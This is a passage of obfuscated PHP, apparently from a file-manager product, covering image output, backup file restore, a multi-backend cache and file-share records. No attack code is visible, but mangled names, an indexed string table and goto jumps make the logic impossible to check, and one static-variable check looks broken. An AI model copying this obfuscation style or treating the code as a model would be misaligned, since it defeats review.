$ùâÛšŸõ = $this->model->pathInfo($¿˜À—Û); if ($ùâÛšŸõ[$Éª“ëó¼[500]] == $Éª“ëó¼[91]) { show_json($Éª“ëó¼[1539] . $¿˜À—Û, !1); } $ãî•¼Ø÷ = $this->model->fileInfoGet($¿˜À—Û); $ùâÛšŸõ[$Éª“ëó¼[181]] = $ãî•¼Ø÷[$Éª“ëó¼[87]]; $GLOBALS[$Éª“ëó¼[180]] = $ùâÛšŸõ; IO::fileOutImage($ãî•¼Ø÷[$Éª“ëó¼[87]], $å°ÂØìˆ); } public function fileOutImage($˜±åÓï, $ÍÛ©Ÿ·è = 250) { $this->_fileOutImage($˜±åÓï, $ÍÛ©Ÿ·è); } public function fileOutImageServer($­§œ…°, $²ÎÅºªÌ = 250) { $this->_fileOutImage($­§œ…°, $²ÎÅºªÌ); } public function link($¬±Ì¬ß‰, $¢Ÿ´»ô™ = '') { $¢¨è›ï¥ = $this->model->fileInfoGet($¬±Ì¬ß‰); return IO::link($¢¨è›ï¥[$_SERVER[µÅ˜º…æ][87]], $¢Ÿ´»ô™); } protected function parse($œĞ‚ëÌ¬) { $„±‘Å½¯ =& $_SERVER[µÅ˜º…æ]; if (strstr($œĞ‚ëÌ¬, $„±‘Å½¯[8]) === !1) { return array($„±‘Å½¯[508] => intval($œĞ‚ëÌ¬), $„±‘Å½¯[87] => $„±‘Å½¯[12], $„±‘Å½¯[1535] => array()); } $ù®øº„ = explode($„±‘Å½¯[8], trim($œĞ‚ëÌ¬, $„±‘Å½¯[8])); if (count($ù®øº„) < 2) { show_tips(clear_html($œĞ‚ëÌ¬) . $„±‘Å½¯[1540]); } return array($„±‘Å½¯[508] => intval($ù®øº„[0]), $„±‘Å½¯[87] => $ù®øº„[1], $„±‘Å½¯[1535] => array_slice($ù®øº„, 1)); } } goto eÓÊ˜ƒ¬—Ÿ; Fîğ…êéÌï: class RestoreFile { public $message; public function __construct() { } public function start($õ¤¦²Ú¢) { $»óÓ¶œ =& $_SERVER[µÅ˜º…æ]; $Å‚®şÉ‡ = Model($»óÓ¶œ[872]); if ($Å‚®şÉ‡->get($»óÓ¶œ[960]) == $»óÓ¶œ[961]) { $this->message = LNG($»óÓ¶œ[962]); return !1; } $õ¤¦²Ú¢ = rtrim($õ¤¦²Ú¢, $»óÓ¶œ[8]) . $»óÓ¶œ[8]; $›Ñ«’Óò = IO::listPath($õ¤¦²Ú¢); if (empty($›Ñ«’Óò[$»óÓ¶œ[85]]) && empty($›Ñ«’Óò[$»óÓ¶œ[86]])) { show_json(LNG($»óÓ¶œ[963]), !1); } $ûç§²ğà = $»óÓ¶œ[964]; $êÚç«ñ = Task::get($ûç§²ğà); if ($êÚç«ñ) { if ($êÚç«ñ[$»óÓ¶œ[849]] == $»óÓ¶œ[938]) { $this->message = LNG($»óÓ¶œ[965]); return !0; } Task::kill($ûç§²ğà); } $­ÒÖ· = array($»óÓ¶œ[87] => $õ¤¦²Ú¢, $»óÓ¶œ[557] => 0, $»óÓ¶œ[204] => 0, $»óÓ¶œ[855] => array($»óÓ¶œ[858] => 0, $»óÓ¶œ[939] => 0, $»óÓ¶œ[863] => 0, $»óÓ¶œ[940] => 0, $»óÓ¶œ[941] => 0), $»óÓ¶œ[966] => array($»óÓ¶œ[858] => 0, $»óÓ¶œ[939] => 0, $»óÓ¶œ[941] => 0)); $´ê˜Ú½¾ = $Å‚®şÉ‡->get($»óÓ¶œ[942], $»óÓ¶œ[967]); $´ê˜Ú½¾ = json_decode($´ê˜Ú½¾, !0); if (!$´ê˜Ú½¾) { $´ê˜Ú½¾ = array(); } $´ê˜Ú½¾ = array_merge($­ÒÖ·, $´ê˜Ú½¾); if (_get($GLOBALS, $»óÓ¶œ[968], 0) == $»óÓ¶œ[91] || !$´ê˜Ú½¾[$»óÓ¶œ[557]]) { $´ê˜Ú½¾ = $­ÒÖ·; } $Œë³û±å = Model($»óÓ¶œ[560]); $ŒïÕ«· = array($»óÓ¶œ[558] => array($»óÓ¶œ[913], $´ê˜Ú½¾[$»óÓ¶œ[557]])); $‘‰è„‡Á = $Œë³û±å->field(array($»óÓ¶œ[948] => $»óÓ¶œ[949], $»óÓ¶œ[950] => $»óÓ¶œ[79]))->where($ŒïÕ«·)->find(); if (!intval($‘‰è„‡Á[$»óÓ¶œ[949]])) { $this->message = LNG($»óÓ¶œ[969]); return !0; } $ùê»Ù÷ = intval($‘‰è„‡Á[$»óÓ¶œ[949]]); $÷˜¾­°© = intval($‘‰è„‡Á[$»óÓ¶œ[79]]); $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[858]] += $ùê»Ù÷; $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[863]] += $÷˜¾­°©; $´ê˜Ú½¾[$»óÓ¶œ[966]][$»óÓ¶œ[858]] = $ùê»Ù÷; $´ê˜Ú½¾[$»óÓ¶œ[204]] = time(); $Å‚®şÉ‡->set($»óÓ¶œ[942], $´ê˜Ú½¾, $»óÓ¶œ[967]); $òŒ»—è¸ = KodIO::defaultDriver(); $ã´ïª„Ê = $òŒ»—è¸[$»óÓ¶œ[487]]; $œğşüÚ† = KodIO::makePath(KodIO::KOD_IO, $ã´ïª„Ê); $êÚç«ñ = new TaskFileTransfer($ûç§²ğà, $»óÓ¶œ[967], $ùê»Ù÷, LNG($»óÓ¶œ[970]) . $»óÓ¶œ[887] . LNG($»óÓ¶œ[917])); $êÚç«ñ->task[$»óÓ¶œ[863]] = $÷˜¾­°©; $‡ØÅüûÊ = 1000; $Á³ÆıÑÌ = 1; $™§“èÌ½ = $»óÓ¶œ[921]; $›Ñ«’Óò = $Œë³û±å->where($ŒïÕ«·)->field($™§“èÌ½)->order($»óÓ¶œ[922])->selectPage($‡ØÅüûÊ, $Á³ÆıÑÌ); $ìåû¤–ä = intval($›Ñ«’Óò[$»óÓ¶œ[443]][$»óÓ¶œ[445]]); while ($›Ñ«’Óò && $Á³ÆıÑÌ <= $ìåû¤–ä) { $¯¡ÉİÄ¶ = array(); foreach ($›Ñ«’Óò[$»óÓ¶œ[446]] as $ôïà¤š¼) { $´ê˜Ú½¾[$»óÓ¶œ[557]] = $ôïà¤š¼[$»óÓ¶œ[557]]; $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[939]]++; $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[940]] += $ôïà¤š¼[$»óÓ¶œ[79]]; $´ê˜Ú½¾[$»óÓ¶œ[966]][$»óÓ¶œ[939]]++; $õ¼ˆÁœ = $ôïà¤š¼[$»óÓ¶œ[87]]; if (IO::exist($õ¼ˆÁœ)) { $êÚç«ñ->update(1); continue; } $ª·ÎÂÓ = substr($õ¼ˆÁœ, strlen("\173\151\x6f\x3a{$ôïà¤š¼[$»óÓ¶œ[925]]}\x7d\x2f")); $¿“Í¨”Â = $œğşüÚ† . $ª·ÎÂÓ; if ($ã´ïª„Ê != $ôïà¤š¼[$»óÓ¶œ[925]] && IO::exist($¿“Í¨”Â)) { $êÚç«ñ->update(1); $¯¡ÉİÄ¶[$ôïà¤š¼[$»óÓ¶œ[557]]] = $¿“Í¨”Â; continue; } $ùÒŞ“îÜ = $õ¤¦²Ú¢ . $ª·ÎÂÓ; if (!$this->isFileExist($ùÒŞ“îÜ)) { $êÚç«ñ->update(1); $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[941]]++; $´ê˜Ú½¾[$»óÓ¶œ[966]][$»óÓ¶œ[941]]++; write_log($»óÓ¶œ[971] . $ùÒŞ“îÜ, $»óÓ¶œ[972]); continue; } $¦š‹Ü‰ş = get_path_father($¿“Í¨”Â); IO::mkdir($¦š‹Ü‰ş); if (!IO::copy($ùÒŞ“îÜ, $¦š‹Ü‰ş, REPEAT_SKIP)) { $´ê˜Ú½¾[$»óÓ¶œ[855]][$»óÓ¶œ[941]]++; $´ê˜Ú½¾[$»óÓ¶œ[966]][$»óÓ¶œ[941]]++; write_log($»óÓ¶œ[973] . $ùÒŞ“îÜ . $»óÓ¶œ[974] . $ôïà¤š¼[$»óÓ¶œ[557]], $»óÓ¶œ[972]); } else { $¯¡ÉİÄ¶[$ôïà¤š¼[$»óÓ¶œ[557]]] = $¿“Í¨”Â; } $êÚç«ñ->update(1); } $this->updateFileBatch($´ê˜Ú½¾, $¯¡ÉİÄ¶, $ã´ïª„Ê); $Á³ÆıÑÌ++; $›Ñ«’Óò = $Œë³û±å->where($ŒïÕ«·)->field($™§“èÌ½)->order($»óÓ¶œ[922])->selectPage($‡ØÅüûÊ, $Á³ÆıÑÌ); } $êÚç«ñ->end(); $this->updateFileBatch($´ê˜Ú½¾, $¯¡ÉİÄ¶, $ã´ïª„Ê); $›Ñ«’Óò = Model($»óÓ¶œ[867])->listData(); $şÒ±öÉ€ = array_to_keyvalue($›Ñ«’Óò, $»óÓ¶œ[12], $»óÓ¶œ[487]); $ÀÂÑß¯È = md5($»óÓ¶œ[975] . implode($»óÓ¶œ[50], $şÒ±öÉ€)); Cache::remove($ÀÂÑß¯È); return !0; } private function isFileExist($Ö±¨÷øê) { static $­Çå½òº = null; if (is_null($µÈíÚü¿)) { $­Çå½òº = array(); } $”Ï›½ù­ = get_path_father($Ö±¨÷øê); if (in_array($”Ï›½ù­, $­Çå½òº)) { return !1; } if (!IO::exist($”Ï›½ù­)) { $­Çå½òº[] = $”Ï›½ù­; return !1; } return IO::exist($Ö±¨÷øê); } private function updateFileBatch($˜“¶Ï§×, &$á„ƒê™Ã, $ÂëÇŒ´é) { $ÂÒˆ¦Êô =& $_SERVER[µÅ˜º…æ]; Model($ÂÒˆ¦Êô[872])->set($ÂÒˆ¦Êô[942], $˜“¶Ï§×, $ÂÒˆ¦Êô[967]); if (!$á„ƒê™Ã) { return; } $Õ‰ïæäÅ = Model($ÂÒˆ¦Êô[560]); $Œ®Ñæáş = $˜òÂ¦Í¼ = array(); foreach ($á„ƒê™Ã as $—ßÅù‡ö => $äµ“äÖ) { $Œ®Ñæáş[] = array($ÂÒˆ¦Êô[557], $—ßÅù‡ö, $ÂÒˆ¦Êô[925], $ÂëÇŒ´é); $˜òÂ¦Í¼[] = array($ÂÒˆ¦Êô[557], $—ßÅù‡ö, $ÂÒˆ¦Êô[87], $äµ“äÖ); } $Õ‰ïæäÅ->saveAll($Œ®Ñæáş); $Õ‰ïæäÅ->saveAll($˜òÂ¦Í¼); write_log($ÂÒˆ¦Êô[976] . count($á„ƒê™Ã) . $ÂÒˆ¦Êô[977] . $ÂëÇŒ´é, $ÂÒˆ¦Êô[972]); $á„ƒê™Ã = array(); } private function updateFile($ºˆíÈåÅ, $ÛóÂú„, $ËÊ°Ÿ•˜, $ØéÙÜŒ) { $À±ªÍµ =& $_SERVER[µÅ˜º…æ]; $ö³Ìø›ï = array($À±ªÍµ[925] => $ÛóÂú„, $À±ªÍµ[87] => $ËÊ°Ÿ•˜); $í¾ŒÑ€ = $ØéÙÜŒ->where(array($À±ªÍµ[557] => $ºˆíÈåÅ))->save($ö³Ìø›ï); if ($í¾ŒÑ€) { return; } write_log($À±ªÍµ[978] . $ºˆíÈåÅ, $À±ªÍµ[972]); } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $›³¯ò™¿ =& $_SERVER[µÅ˜º…æ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $Òğ¼Ñâª = $GLOBALS[$›³¯ò™¿[6]][$›³¯ò™¿[424]]; $¬‚ê÷×“ = $Òğ¼Ñâª[$Òğ¼Ñâª[$›³¯ò™¿[979]]]; $–ÀÃúÂé = $Òğ¼Ñâª[$›³¯ò™¿[980]]; switch ($Òğ¼Ñâª[$›³¯ò™¿[979]]) { case $›³¯ò™¿[21]: self::$handle = Model($›³¯ò™¿[981]); break; case $›³¯ò™¿[982]: self::$handle = new CacheRedis($¬‚ê÷×“, $–ÀÃúÂé); break; case $›³¯ò™¿[983]: self::$handle = new CacheMemcached($¬‚ê÷×“, $–ÀÃúÂé); break; case $›³¯ò™¿[230]: self::$handle = new CacheFile($¬‚ê÷×“, $–ÀÃúÂé); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ô·à¬ä») { if (is_array($ô·à¬ä») || is_object($ô·à¬ä»)) { $ô·à¬ä» = json_encode($ô·à¬ä»); } $ô·à¬ä» = rawurlencode($ô·à¬ä»); return md5(KOD_SITE_ID . $_SERVER[µÅ˜º…æ][11] . $ô·à¬ä»); } public static function get($‡ÂÌÁË¶, $ı²‡ Ô¦ = false) { $—¹ßóÛé = self::key($‡ÂÌÁË¶); $ıÃ³µ³ = self::init(); if ($ı²‡ Ô¦) { return unserialize($ıÃ³µ³->get($—¹ßóÛé)); } if (!isset(self::$memoryCache[$—¹ßóÛé])) { $õÍıÁ¦œ = $ıÃ³µ³->get($—¹ßóÛé); self::$memoryCache[$—¹ßóÛé] = unserialize($õÍıÁ¦œ); } return self::$memoryCache[$—¹ßóÛé]; } public static function set($´¾—ë¦«, $â§’¦ÊÒ, $—¦úÕÜÚ = false) { $Ô¡Òã£ =& $_SERVER[µÅ˜º…æ]; $ö×±™–† = self::key($´¾—ë¦«); if (isset(self::$memoryCache[$ö×±™–†]) && self::$memoryCache[$ö×±™–†] === $â§’¦ÊÒ) { return !0; } if ($—¦úÕÜÚ === 0) { self::$memoryCache[$ö×±™–†] = $â§’¦ÊÒ; return !0; } $¯“óƒç” = self::init(); $»‚ÆÅÁ = serialize($â§’¦ÊÒ); CacheLock::lock($´¾—ë¦« . $Ô¡Òã£[984]); $¨´Ø•±ï = $¯“óƒç”->set($ö×±™–†, $»‚ÆÅÁ, $—¦úÕÜÚ); self::$memoryCache[$ö×±™–†] = $â§’¦ÊÒ; CacheLock::unlock($´¾—ë¦« . $Ô¡Òã£[984]); return $¨´Ø•±ï; } public static function getCall($Á­üĞò, $õã€ÚŸî, $†ÎûŸù´, $ £ï ´ = array()) { $ÂØ‹°ƒÈ =& $_SERVER[µÅ˜º…æ]; $Æµğ˜Ø = self::get($Á­üĞò); if ($Æµğ˜Ø || $Æµğ˜Ø === $ÂØ‹°ƒÈ[12]) { return $Æµğ˜Ø; } $Æµğ˜Ø = call_user_func_array($†ÎûŸù´, $ £ï ´); $Æµğ˜Ø = $Æµğ˜Ø ? $Æµğ˜Ø : $ÂØ‹°ƒÈ[12]; self::set($Á­üĞò, $Æµğ˜Ø, $õã€ÚŸî); return $Æµğ˜Ø; } public static function limitCall($ö—íš‡Ã, $å­¤ğ½ = 15, $µÄ×îÄ‘ = 30, $õ¦òàñÉ = true) { $¹ğ¢ƒ‚î =& $_SERVER[µÅ˜º…æ]; static $ª…‡Ÿ‰Ô = array(); if ($õ¦òàñÉ) { $ö—íš‡Ã = $ö—íš‡Ã . $¹ğ¢ƒ‚î[985] . KodUser::id() . $¹ğ¢ƒ‚î[986] . get_client_ip(); } if (isset($ª…‡Ÿ‰Ô[$ö—íš‡Ã]) && is_array($ª…‡Ÿ‰Ô[$ö—íš‡Ã])) { return $ª…‡Ÿ‰Ô[$ö—íš‡Ã][$¹ğ¢ƒ‚î[332]] <= $µÄ×îÄ‘; } $“¸İˆçº = self::get($ö—íš‡Ã); if (!is_array($“¸İˆçº) || time() - $“¸İˆçº[$¹ğ¢ƒ‚î[204]] > $å­¤ğ½) { $“¸İˆçº = array($¹ğ¢ƒ‚î[204] => time(), $¹ğ¢ƒ‚î[332] => 0); } $“¸İˆçº[$¹ğ¢ƒ‚î[332]]++; self::set($ö—íš‡Ã, $“¸İˆçº, $å­¤ğ½); $ª…‡Ÿ‰Ô[$ö—íš‡Ã] = $“¸İˆçº; return $“¸İˆçº[$¹ğ¢ƒ‚î[332]] <= $µÄ×îÄ‘; } public static function limitRuntime($“ö½ñå«, $Á¢ˆ´ª) { $áæ­Ö¼Á = $_SERVER[µÅ˜º…æ][987] . $“ö½ñå«; if (isset(self::$runTimeCache[$áæ­Ö¼Á]) || !$Á¢ˆ´ª) { return !0; } $Â·ü¼¹  = intval(self::get($áæ­Ö¼Á)); $Â·ü¼¹  = !$Â·ü¼¹  || $Â·ü¼¹  <= 0 ? 1 : $Â·ü¼¹  + 1; if ($Â·ü¼¹  > $Á¢ˆ´ª) { return !1; } self::$runTimeCache[$áæ­Ö¼Á] = !0; self::set($áæ­Ö¼Á, $Â·ü¼¹ , 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $ˆ˜ë‹è» => $Ë¨ºĞà) { $Ñş‡Õä = intval(self::get($ˆ˜ë‹è»)); $Ñş‡Õä = !$Ñş‡Õä || $Ñş‡Õä <= 1 ? 0 : $Ñş‡Õä - 1; self::set($ˆ˜ë‹è», $Ñş‡Õä, 3600); } self::$runTimeCache = array(); } public static function remove($ÖªÒ”€) { $´¬”âÚú = self::key($ÖªÒ”€); unset(self::$memoryCache[$´¬”âÚú]); self::clearTimeout(); CacheLock::lock($ÖªÒ”€); $ÀĞ‰ˆ = self::init()->remove($´¬”âÚú); CacheLock::unlock($ÖªÒ”€); return $ÀĞ‰ˆ; } public static function removeMemory($½ô—íƒ“) { $Ã¢¿®‡ = self::key($½ô—íƒ“); unset(self::$memoryCache[$Ã¢¿®‡]); } public static function clearMemory($¢§¸Ã = false) { if ($¢§¸Ã) { $¢§¸Ã = self::key($¢§¸Ã); unset(self::$memoryCache[$¢§¸Ã]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[µÅ˜º…æ][988])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[µÅ˜º…æ][989])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($”Üø½“Ø, $°ƒƒî“) { $Á°¤À¶ =& $_SERVER[µÅ˜º…æ]; $this->cachePath = $”Üø½“Ø[$Á°¤À¶[87]]; $this->prefix = $Á°¤À¶[990]; $this->cacheTime = $°ƒƒî“; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($À±íÆ”¤) { $í€•µÄŒ =& $_SERVER[µÅ˜º…æ]; $À±íÆ”¤ = str_replace(array($í€•µÄŒ[991], $í€•µÄŒ[97], $í€•µÄŒ[76]), $í€•µÄŒ[992], $À±íÆ”¤); return $this->cachePath . $í€•µÄŒ[993] . $À±íÆ”¤ . $í€•µÄŒ[994]; } public function set($µŸè¶à², $åà°‡âŸ, $š‘¼‹¹„ = false) { $š‘¼‹¹„ = $š‘¼‹¹„ ? $š‘¼‹¹„ : $this->cacheTime; $ñÑ™µÎå = $this->getFile($µŸè¶à²); if (file_put_contents($ñÑ™µÎå, $this->prefix . $åà°‡âŸ, LOCK_EX)) { @touch($ñÑ™µÎå, intval(time() + $š‘¼‹¹„)); clearstatcache(); return !0; } @unlink($ñÑ™µÎå); return !1; } public function get($À“´¼²) { $®‹øƒ¤Ö = $this->getFile($À“´¼²); if (file_exists($®‹øƒ¤Ö) && filemtime($®‹øƒ¤Ö) < time()) { @unlink($®‹øƒ¤Ö); return !1; } $Ñ–®ûÜ¨ = @file_get_contents($®‹øƒ¤Ö); return substr($Ñ–®ûÜ¨, strlen($this->prefix)); } public function remove($‚ÌÂâë•) { $íûğô¿‰ = $this->getFile($‚ÌÂâë•); return @unlink($íûğô¿‰); } public function deleteAll() { $ªóÀÂÙ =& $_SERVER[µÅ˜º…æ]; $ÄÕå¶“ê = scandir($this->cachePath); foreach ($ÄÕå¶“ê as $ªÌâ¥§Û) { $É¬‡­ Ù = $this->cachePath . $ªÌâ¥§Û; if (strpos($É¬‡­ Ù, $ªóÀÂÙ[994]) && strpos($É¬‡­ Ù, $ªóÀÂÙ[995])) { @unlink($É¬‡­ Ù); } } } public function clearTimeout() { $÷ÒÍ±Çª =& $_SERVER[µÅ˜º…æ]; $îÜÚ£ˆø = scandir($this->cachePath); foreach ($îÜÚ£ˆø as $‰Ğ¦ÏÆã) { $†­•ççÆ = $this->cachePath . $‰Ğ¦ÏÆã; if (strpos($†­•ççÆ, $÷ÒÍ±Çª[994]) && strpos($†­•ççÆ, $÷ÒÍ±Çª[995]) && filemtime($†­•ççÆ) < time()) { @unlink($†­•ççÆ); } } } } goto D×Ú²²ƒùƒ; F´¶ëÀàó£: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\155\x65", "\164\151\155\145", "\151\156\163\145\x72\x74\54\x75\x70\x64\x61\164\145", "\x66\165\156\143\164\x69\x6f\x6e"), array("\143\x72\x65\x61\x74\145\124\151\x6d\x65", "\164\151\155\x65", "\x69\x6e\163\145\162\164", "\x66\x75\156\143\x74\151\157\156"), array("\157\x70\164\x69\157\x6e\163", '', "\151\x6e\x73\x65\162\164\x2c\x75\160\x64\141\164\145\54\163\145\x6c\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($Ê£üÑÃ¦) { $××“ÒÈš =& $_SERVER[µÅ˜º…æ]; return array($××“ÒÈš[2322] => array(USER_ID, $××“ÒÈš[2323]), $××“ÒÈš[2324] => array($Ê£üÑÃ¦[0], $××“ÒÈš[2325])); } protected function ___listSimple() { $úÀ®İŞ€ = $this->field($this->fieldList)->where(array($_SERVER[µÅ˜º…æ][1593] => USER_ID))->select(); return $úÀ®İŞ€ ? $úÀ®İŞ€ : array(); } protected function ___getInfoShare($©Ê†‚©) { return $this->_getShareInfo(array($_SERVER[µÅ˜º…æ][687] => $©Ê†‚©), !1); } protected function getInfo($©Ğ‰®íş) { $¶µ£¬ü = $this->getInfoShare($©Ğ‰®íş); return $this->shareSourceInfo($¶µ£¬ü); } public function getInfoByHash($¤Œíé†÷) { return $this->_getShareInfo(array($_SERVER[µÅ˜º…æ][1555] => $¤Œíé†÷)); } public function getInfoByPath($éïƒŠ¯ò) { $ªÈ¯¦ =& $_SERVER[µÅ˜º…æ]; $Ë¼¦ü¯ = array($ªÈ¯¦[1593] => USER_ID, $ªÈ¯¦[191] => $éïƒŠ¯ò); return $this->_getShareInfo($Ë¼¦ü¯); } public function getInfoBySourcePath($í‚Š†Î«) { $¡“¸›¿ô =& $_SERVER[µÅ˜º…æ]; $†ãñ³†Å = array($¡“¸›¿ô[1593] => USER_ID, $¡“¸›¿ô[583] => $í‚Š†Î«); return $this->_getShareInfo($†ãñ³†Å); } private function _getShareInfo($Œ÷Ç¤ĞØ, $ßù¬ı‡Ò = true) { $È£®Úâï =& $_SERVER[µÅ˜º…æ]; $õÏ¥Ìœ© = $this->where($Œ÷Ç¤ĞØ)->find(); if (!$õÏ¥Ìœ©) { return !1; } if (!is_array($õÏ¥Ìœ©[$È£®Úâï[580]])) { $õÏ¥Ìœ©[$È£®Úâï[580]] = array(); } $Œ÷Ç¤ĞØ = array($È£®Úâï[687] => $õÏ¥Ìœ©[$È£®Úâï[687]]); $Ü™‘Ö¤ = $È£®Úâï[2326]; $õÏ¥Ìœ©[$È£®Úâï[1551]] = Model($È£®Úâï[688])->order($È£®Úâï[487])->field($Ü™‘Ö¤)->where($Œ÷Ç¤ĞØ)->select(); if (!$ßù¬ı‡Ò) { return $õÏ¥Ìœ©; } return $this->shareSourceInfo($õÏ¥Ìœ©); } private function shareSourceInfo($¸òêÅ§) { $«šÒÉ¶ =& $_SERVER[µÅ˜º…æ]; if (!is_array($¸òêÅ§)) { return $¸òêÅ§; } if ($¸òêÅ§[$«šÒÉ¶[191]] == $«šÒÉ¶[228]) { $¸òêÅ§[$«šÒÉ¶[90]] = IO::info($¸òêÅ§[$«šÒÉ¶[583]]); } else { $¸òêÅ§[$«šÒÉ¶[90]] = Model($«šÒÉ¶[1534])->pathInfo($¸òêÅ§[$«šÒÉ¶[191]]); } return $¸òêÅ§; } protected function getInfoAuth($ŠèÉ°„Ù) { $ãÎ×ìû‹ =& $_SERVER[µÅ˜º…æ]; $¼îÆŞÊÑ = $this->getInfo($ŠèÉ°„Ù); if ($¼îÆŞÊÑ[$ãÎ×ìû‹[1593]] == USER_ID) { $¼îÆŞÊÑ[$ãÎ×ìû‹[502]] = $¼îÆŞÊÑ[$ãÎ×ìû‹[90]][$ãÎ×ìû‹[502]]; } else { $¼îÆŞÊÑ[$ãÎ×ìû‹[502]] = Model($ãÎ×ìû‹[587])->authMake($¼îÆŞÊÑ[$ãÎ×ìû‹[1551]]); } return $¼îÆŞÊÑ; } protected function listData($ˆÍ£ÍÑ = null, $é¥š¶ É = 300) { $“Áãå½ =& $_SERVER[µÅ˜º…æ]; $ÁµÒ¥˜£ = array(array($“Áãå½[578] => array($“Áãå½[1181], 0), $“Áãå½[685] => array($“Áãå½[1181], 0), $“Áãå½[2327] => $“Áãå½[2283])); if ($ˆÍ£ÍÑ == $“Áãå½[2328]) { $ÁµÒ¥˜£ = array($“Áãå½[578] => 1); } else { if ($ˆÍ£ÍÑ == $“Áãå½[1348]) { $ÁµÒ¥˜£ = array($“Áãå½[685] => 1); } } $ÁµÒ¥˜£[$“Áãå½[1593]] = USER_ID; $¯›÷Ôã§ = $this->where($ÁµÒ¥˜£)->selectPage($é¥š¶ É); return $¯›÷Ôã§; } protected function listToMe($Š…¶¼¼Ò = 300) { $”¦ÜŸÕ¥ =& $_SERVER[µÅ˜º…æ]; $ù„Õ‹®Ú = Model($”¦ÜŸÕ¥[2329])->userGroupParents(USER_ID); $ÅÍÇëêú = array($”¦ÜŸÕ¥[670] => SourceModel::TYPE_USER, $”¦ÜŸÕ¥[589] => USER_ID); if ($ù„Õ‹®Ú) { $ÅÍÇëêú = array(array($”¦ÜŸÕ¥[670] => SourceModel::TYPE_USER, $”¦ÜŸÕ¥[589] => USER_ID), array($”¦ÜŸÕ¥[670] => SourceModel::TYPE_GROUP, $”¦ÜŸÕ¥[589] => array($”¦ÜŸÕ¥[7], $ù„Õ‹®Ú)), $”¦ÜŸÕ¥[2327] => $”¦ÜŸÕ¥[2283]); } $Ç­íÊÁ‘ = Model($”¦ÜŸÕ¥[688])->field($”¦ÜŸÕ¥[687])->where($ÅÍÇëêú)->select(); $Ç­íÊÁ‘ = array_unique(array_to_keyvalue($Ç­íÊÁ‘, $”¦ÜŸÕ¥[12], $”¦ÜŸÕ¥[687])); $ÅÍÇëêú = array($”¦ÜŸÕ¥[687] => array($”¦ÜŸÕ¥[507], $Ç­íÊÁ‘)); if (!$Ç­íÊÁ‘) { return array($”¦ÜŸÕ¥[446] => array(), $”¦ÜŸÕ¥[443] => array($”¦ÜŸÕ¥[2330] => 0, $”¦ÜŸÕ¥[428] => 1)); } $°ğûâÛ = Model($”¦ÜŸÕ¥[688])->where($ÅÍÇëêú)->select(); $°ğûâÛ = array_to_keyvalue_group($°ğûâÛ, $”¦ÜŸÕ¥[687]); $ŸÚ¬û· = $”¦ÜŸÕ¥[2331]; $ª¹¤é‹ = $this->field($ŸÚ¬û·)->where($ÅÍÇëêú)->selectPage($Š…¶¼¼Ò); foreach ($ª¹¤é‹[$”¦ÜŸÕ¥[446]] as $Ï³ İ‚ => &$ûãé‘¿£) { $ûãé‘¿£[$”¦ÜŸÕ¥[1551]] = $°ğûâÛ[$ûãé‘¿£[$”¦ÜŸÕ¥[687]]]; } unset($ûãé‘¿£); return $ª¹¤é‹; } protected function shareAdd($¸èç­“´, $Ÿ®öõ«¥) { $’ê’—£­ =& $_SERVER[µÅ˜º…æ]; $áÀæ×Ûæ = $this->_addShareData($¸èç­“´, $Ÿ®öõ«¥); if (!empty($Ÿ®öõ«¥[$’ê’—£­[2332]])) { $this->_shareAuthSet($áÀæ×Ûæ, $Ÿ®öõ«¥[$’ê’—£­[2332]]); } $this->shareEventAdd($¸èç­“´, $Ÿ®öõ«¥, $’ê’—£­[2333]); return $áÀæ×Ûæ; } protected function shareAddSystem($¾Îõüñº, $÷ÆÀúŠÖ) { $–¢üúş÷ =& $_SERVER[µÅ˜º…æ]; $¨´Ò¹ = $this->_addShareData($¾Îõüñº, $÷ÆÀúŠÖ, $–¢üúş÷[189]); $this->_shareAuthSet($¨´Ò¹, $÷ÆÀúŠÖ[$–¢üúş÷[2332]]); return $¨´Ò¹; } private function shareEventAdd($ğÃÎ­ÇÒ, $¿×¯áËõ, $ª•Üó¶ƒ = "\x61\144\144") { $Š¶÷æÇÍ =& $_SERVER[µÅ˜º…æ]; if (!$ğÃÎ­ÇÒ || $ğÃÎ­ÇÒ == $Š¶÷æÇÍ[228]) { return; } if ($ª•Üó¶ƒ == $Š¶÷æÇÍ[2333]) { if ($¿×¯áËõ[$Š¶÷æÇÍ[578]] == $Š¶÷æÇÍ[91]) { Model($Š¶÷æÇÍ[655])->eventShare($ğÃÎ­ÇÒ, $Š¶÷æÇÍ[2334]); } if ($¿×¯áËõ[$Š¶÷æÇÍ[685]] == $Š¶÷æÇÍ[91]) { Model($Š¶÷æÇÍ[655])->eventShare($ğÃÎ­ÇÒ, $Š¶÷æÇÍ[2335]); } return; } $¤Ğ˜²Í± = $this->getInfoByPath($ğÃÎ­ÇÒ); $ÁÆşš·À = $Š¶÷æÇÍ[2336]; if ($¤Ğ˜²Í±[$Š¶÷æÇÍ[578]] == $Š¶÷æÇÍ[228] && $¿×¯áËõ[$Š¶÷æÇÍ[578]] == $Š¶÷æÇÍ[91]) { $ÁÆşš·À = $Š¶÷æÇÍ[2334]; } if ($¤Ğ˜²Í±[$Š¶÷æÇÍ[578]] == $Š¶÷æÇÍ[91] && $¿×¯áËõ[$Š¶÷æÇÍ[578]] == $Š¶÷æÇÍ[228]) { $ÁÆşš·À = $Š¶÷æÇÍ[2337]; } if 